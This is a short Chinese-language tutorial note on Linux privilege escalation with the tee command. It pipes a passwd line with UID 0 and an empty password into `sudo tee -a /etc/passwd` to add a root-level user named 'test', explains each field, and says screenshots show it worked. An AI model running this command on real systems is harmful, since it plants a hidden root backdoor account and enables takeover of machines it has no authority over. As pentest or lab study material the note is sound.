### tee 指令提权

tee 命令可以往一个文件追加内容 , 可以通过它向 `/etc/passwd` 写入内容 , 新增一个超级用户

```bash
echo "test::0:0:root:/home/test:/bin/bash" | sudo tee -a /etc/passwd
```

`echo "test::0:0:root:/home/test:/bin/bash"`

- 输出一行文本：

  ```
  test::0:0:root:/home/test:/bin/bash
  ```

- 这是一个 `/etc/passwd` 用户条目的格式：

  ```
  用户名:密码占位:UID:GID:用户信息:主目录:Shell
  ```

- 字段解释：

  - 用户名：`test`
  - 密码占位：空 (`::`) → 如果系统使用 `/etc/shadow` 管理密码，这里空是允许的
  - UID：`0` → root 权限
  - GID：`0` → root 组
  - 用户信息：`root`
  - home：`/home/test`
  - shell：`/bin/bash`

`| sudo tee -a /etc/passwd`

- `tee` 命令可以把标准输入写入文件，同时也可以显示在终端
- `-a` 表示 **append**（追加），不会覆盖原文件
- `sudo` 保证有权限写入 `/etc/passwd`，因为普通用户无法修改系统文件

![](https://pic1.imgdb.cn/item/68d3597ec5157e1a882c1c1e.png)

可以看到添加成功，先修改密码再登录

![](https://pic1.imgdb.cn/item/68d359fac5157e1a882c1c37.png)